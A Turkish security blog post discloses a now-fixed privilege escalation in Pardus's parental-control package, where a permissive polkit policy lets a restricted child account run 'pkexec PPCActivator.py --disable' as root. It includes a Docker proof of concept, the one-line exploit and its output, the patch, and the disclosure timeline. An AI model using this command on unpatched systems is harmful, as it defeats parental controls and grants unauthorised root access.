---
layout: post
title: "Pardus ebeveyn kontrolünde tek satırlık pkexec ile çocuk hesabından root'a çıkış"
author: Yunus Aydın
date: 2026-06-14
lang: tr
description: "Pardus pardus-parental-control paketinin polkit policy'sinde allow_any=yes vardı. Kısıtlı çocuk hesabı pkexec ile PPCActivator.py --disable çalıştırıp tüm filtreleri root olarak kaldırabiliyordu. v0.7.0 ile düzeltildi."
keywords: "Pardus, pardus-parental-control, polkit, pkexec, privilege escalation, ebeveyn kontrolü bypass, CWE-269, CWE-862, allow_any, auth_admin, Linux güvenlik, güvenlik araştırması"
canonical_url: "https://aydinnyunus.github.io/2026/06/14/pardus-parental-control-polkit-privilege-escalation-tr/"
---

Ben [pardus-parental-control](https://github.com/pardus/pardus-parental-control) paketinde bulduğum local privilege escalation'ı 6 Haziran 2026'da Pardus ekibine [PR #5](https://github.com/pardus/pardus-parental-control/pull/5) olarak raporladım. Programın `--disable` modunu çağıran polkit action'ı tamamen açıktı. Sistemdeki herhangi bir kullanıcı, üstelik yazılımın korumaya çalıştığı o kısıtlı çocuk hesabı bile, `pkexec PPCActivator.py --disable` komutunu çalıştırıp tüm filtreleri kaldırabiliyordu. Parola yok. Prompt yok. `auth.log`'da göze çarpacak bir kayıt da yok.

Maintainer hatayı doğruladı, benim tek satırlık fix'imi login akışını bozduğu için reddetti ve düzgün bir refactor'la [v0.7.0](https://github.com/pardus/pardus-parental-control/releases/tag/debian%2F0.7.0)'ı 10 Haziran 2026'da yayınladı.

## Arka plan

Pardus TÜBİTAK tarafından geliştirilen Türkiye'nin ulusal Linux dağıtımı. `pardus-parental-control` ise ebeveynlere ortak makinedeki çocuklarının ne yapabileceğini kısıtlamak için bir GTK arayüzü sunan paket: engellenen uygulamalar, engellenen siteler, günlük oturum süresi limitleri, özel DNS.

Bu repo'ya, dağıtımla birlikte gelen GUI araçlarının polkit'i nasıl kullandığını denetlerken denk geldim. Pattern artık neredeyse meme: bir geliştirici `pkexec my-helper.py`'nin GUI içinde "çalışsın yeter" diye `allow_any=yes` ayarlıyor, test sırasında parola sormasın diye böyle bırakıyor, paketliyor ve unutuyor.

Bu da tam olarak öyle bir vakaydı.

## Savunmasız policy

Policy dosyası `polkit/tr.org.pardus.pkexec.parental-control.policy` yolunda. `debian/0.6.1` itibariyle ilgili blok:

```xml
<action id="tr.org.pardus.pkexec.parental-control-action">
  <description>Pardus Restricted Access Authentication</description>
  <message>Authentication is required.</message>
  <icon_name>preferences-system</icon_name>

  <defaults>
    <allow_any>yes</allow_any>
    <allow_inactive>yes</allow_inactive>
    <allow_active>yes</allow_active>
  </defaults>

  <annotate key="org.freedesktop.policykit.exec.path">/usr/share/pardus/pardus-parental-control/src/PPCActivator.py</annotate>
  <annotate key="org.freedesktop.policykit.exec.allow_gui">true</annotate>
  <annotate key="org.freedesktop.policykit.owner">unix-user:root</annotate>
</action>
```

Üç `<allow_*>` değeri action'ı kimin çağırabileceğini ve auth gerekip gerekmediğini kontrol ediyor. `yes` "izin ver, auth istenmesin" demek. Üçünü birden `yes` yapmak, oturum durumundan bağımsız olarak herhangi bir local UID'nin sarılan programı root olarak çalıştırabilmesi anlamına geliyor.

Peki sarılan program ne yapıyor? `PPCActivator.py` bir `--disable` flag'ı kabul ediyor. İlgili kısım:

```python
if sys.argv[1] == "--disable":
    activator.clear_application_filter()
    activator.clear_website_filter()
    sys.exit(0)
```

`clear_application_filter()` ve `clear_website_filter()` tam isimlerindeki şeyi yapıyorlar. Ebeveyn kontrolünün uyguladığı iptables/nftables kurallarını, dnsmasq override'larını ve uygulama başlatıcı kısıtlarını söküyorlar.

Yani policy "bunu kim isterse root olarak çalıştırsın, auth yok" diyor. Program "--disable verildiyse tüm filtreleri kaldır" diyor. İkisini üst üste koy: ebeveyn kontrolünün kısıtlamaya çalıştığı hesabın bile çalıştırabildiği bir privilege escalation, bir yandan da ebeveyn kontrolü bypass'ı.

Aynı repo, aynı dosyada, başka bir action için doğru pattern zaten vardı:

```xml
<action id="tr.org.pardus.pkexec.parental-control-action-system-preferences-change">
  <defaults>
    <allow_any>auth_admin</allow_any>
    <allow_inactive>auth_admin</allow_inactive>
    <allow_active>auth_admin_keep</allow_active>
  </defaults>
  ...
</action>
```

Bu action admin auth istiyordu. Yan yana iki action, biri güvenli, biri değil. Klasik copy-paste sapması.

## Proof of concept

Reprodüksiyon gerçekten tek komut. Pardus VM kurmamak için Debian Bookworm container'ında çalıştım:

```bash
# Temiz bir Debian kutusu ayağa kaldır
docker run -d --name pardus-poc --privileged debian:bookworm sleep infinity
docker exec -it pardus-poc bash

# polkit ve paketi shipped haliyle yükle
apt-get update
apt-get install -y polkit python3 git
git clone --branch debian/0.6.1 https://github.com/pardus/pardus-parental-control.git
cp pardus-parental-control/polkit/tr.org.pardus.pkexec.parental-control.policy \
   /usr/share/polkit-1/actions/
mkdir -p /usr/share/pardus/pardus-parental-control/src
cp -r pardus-parental-control/src/* /usr/share/pardus/pardus-parental-control/src/

# Yazılımın kısıtlamak için var olduğu "çocuk" hesabını oluştur
useradd -m -s /bin/bash kid

# kid olarak ebeveyn kontrolünü bypass et
su - kid -c "id; pkexec /usr/share/pardus/pardus-parental-control/src/PPCActivator.py --disable; echo exit=$?"
```

Çıktı:

```text
uid=1000(kid) gid=1000(kid) groups=1000(kid)
=== PPCActivator Service Started ===
exit=0
```

Prompt yok. `polkit-auth-dialog` yok. Sarılan script içinde effective UID 0. Filtreler temizlendi. Çocuk artık istediği uygulamalarla açık internete çıkmış durumda.

Script işini yapmadan önce effective UID'yi doğrulamak isteyen olursa, `PPCActivator.py`'nin en üstüne tek satır eklesin:

```python
import os, sys
sys.stderr.write(f"uid={os.getuid()} euid={os.geteuid()} pkexec_uid={os.environ.get('PKEXEC_UID')}\n")
```

`uid=0 euid=0 pkexec_uid=1000` göreceksin. O `PKEXEC_UID=1000` smoking gun: pkexec çocuğu (UID 1000) root'a yükseltti ve script hiç kontrol etmedi.

## Etki

* Kısıtlı çocuk hesabı, yani yazılımın kısıtlamak için var olduğu kullanıcı, bir tutorial'dan veya Discord ekran görüntüsünden kopyalayabileceği tek bir komutla ebeveyn kontrolünün tamamını devre dışı bırakabilir.
* Sistemdeki başka herhangi bir local UID, servis hesapları ya da ele geçirilmiş düşük yetkili processler dahil, bu paket kurulu bir Pardus desktop'ta bedava root LPE elde eder. Polkit action'ı `PPCActivator.py`'yi root olarak çalıştırıyor ve script argv'ye sorgusuz sualsiz güveniyor.
* `auth.log`'da iz yok çünkü log'lanacak bir authentication eventi de yok. Tek izi yazılımın kendi `/var/log/pardus-parental-control.log` kaydı oluyor, onu da meraklı bir çocuk okuyup öğrenebilir.
* Teknik olmayan ebeveynlere yönelik dağıtım özelliğinin tüm trust modelini çürütüyor. Ebeveyn kurulum sırasında gördüğü GUI parola promptunun ilerideki değişiklikler için de geçerli olduğunu makul bir varsayımla düşünüyor.

## Düzeltme

Benim PR'ım satır başına üç karakter, toplam üç satırdı:

```diff
-      <allow_any>yes</allow_any>
-      <allow_inactive>yes</allow_inactive>
-      <allow_active>yes</allow_active>
+      <allow_any>auth_admin</allow_any>
+      <allow_inactive>auth_admin</allow_inactive>
+      <allow_active>auth_admin_keep</allow_active>
```

`auth_admin` polkit'ten action çalışmadan önce admin parolası istemesini istiyor. `auth_admin_keep` aynısı, ama aktif oturum içinde credential'ı beş dakika cache'liyor ki admin ardışık çağrılarda her seferinde sorulmasın.

Maintainer haklı bir noktaya değindi: bu patch login akışını bozuyordu. `PPCActivator.py` aynı zamanda login'de (`--disable` olmadan) kısıtlamaları uygulamak için çağrılıyor; her login'de admin promptu zorlamak ebeveynin paketi ya kaldırmasına ya da daha kötüsü "Cancel"a basıp çocuğu yanlışlıkla içeri salmaya eğitilmesine yol açardı.

v0.7.0'da inen doğru fix, fazla yüklenmiş tek polkit action'ını operasyon başına ayrı action'lara böldü. Login'de kısıtlama uygulamak parolasız kalıyor. Kısıtlamayı kaldırmak admin auth istiyor. Session log'lama otomatik kalıyor. Sistem tercihi değişikliği zaten auth istiyordu. Tek açık kapı yerine dört dar kapsamlı action.

Fix'in alması gereken şekil bu. Daha geniş ders şu: "bu script'le root olarak ne istersen yap" diyen tek bir polkit action'ı her zaman yanlış olur, çünkü script büyür ve policy geri kalır.

## Bu pattern neden tekrar tekrar çıkıyor

Polkit konfigürasyon modeli, tembel yolu cezalandıran o arayüzlerden biri. `allow_any=yes` yazmak `auth_admin`'den daha kısa, dev-loop'u sessizleştiriyor ve sonuçları ancak makineyi paylaşan bir saldırgan yanlış subcommand'ı çalıştırınca ortaya çıkıyor. Statik analiz araçları çoğu zaman bunu flag'lemez çünkü dosya, ilk PR'dan sonra kimsenin bakmadığı vendor-isimli bir dizinde duran bir XML.

Daha derin yapısal sorun şu: policy bir *operasyonu* değil, bir *programı* yetkilendiriyor. Pardus ekibi "PPCActivator.py'yi herkes root olarak çalıştırabilir" diyen tek bir action yazmış, ama `PPCActivator.py`'nin çok farklı iki operasyonu kapsadığını farketmemiş: kısıtlama uygula (sessiz ve otomatik olmalı) ve kısıtlamayı kaldır (admin gerekmeli). Polkit bu ayrımı ifade etmek için gerekli yapı taşlarını sunuyor. Sadece kullanmayı seçmen lazım.

Aynı şekil yıllardır Linux desktop helper'larına yazılan onlarca CVE'de tekrar ediyor. Bir geliştiricinin kolaylık olsun diye bir scripti pkexec'e bağladığı ve klavyenin başında başka kimlerin oturabileceğini düşünmediği her vaka. CWE-269 (Improper Privilege Management) ve CWE-862 (Missing Authorization) ikisi de burada uygulanabilir, polkit'e özgü tadıyla: eksik yetkilendirme tam orada XML'de duruyor, `auth_admin`'e çevrilmeyi bekliyor.

## Raporlama zaman çizelgesi

* **6 Haziran 2026** `pardus/pardus-parental-control` üzerinde analiz, PoC ve üç satırlık patch ile PR #5'i açtım.
* **7 Haziran 2026** Maintainer @eminfedar hatayı doğruladı, login UX'ini bozacağı için PR'ı reddetti ve düzgün bir refactor sözü verdi.
* **10 Haziran 2026** `debian/0.7.0` yayınlandı, polkit action'ı bölündü ve gerçek fix indi. Maintainer PR thread'inde teşekkür etti.
* **14 Haziran 2026** Bu yazıyı yayınladım.

CVE talep edilmedi ve atanmadı. Fix upstream'de ve tag'lendi. `debian/0.6.1` veya öncesinde olan herkesin güncellemesi gerekiyor.

## Referanslar

* [PR #5: fix: require admin auth for PPCActivator.py polkit action](https://github.com/pardus/pardus-parental-control/pull/5)
* [debian/0.7.0 sürümü](https://github.com/pardus/pardus-parental-control/releases/tag/debian%2F0.7.0)
* [polkit pkexec(1) dokümantasyonu](https://www.freedesktop.org/software/polkit/docs/latest/pkexec.1.html)
* [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
* [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)

## İlgili içerik

* [Family Link trailing-dot bypass: Google'ın ebeveyn kontrolünden nasıl kaçtım]({% post_url 2026-06-14-family-link-trailing-dot-bypass-tr %})
* [BasicSR slurm runner: dataset path üzerinden command injection (CVE-2024-27763)]({% post_url 2026-06-14-cve-2024-27763-basicsr-slurm-command-injection-tr %})

Dağıtım paketin bir Python scriptini pkexec'e bağlıyorsa, script'i okumadan önce policy dosyasını oku. `<defaults>` bloğu kimin seni çağırabileceği hakkında her şeyi söylüyor ve `yes` orada hiçbir zaman doğru cevap değil.
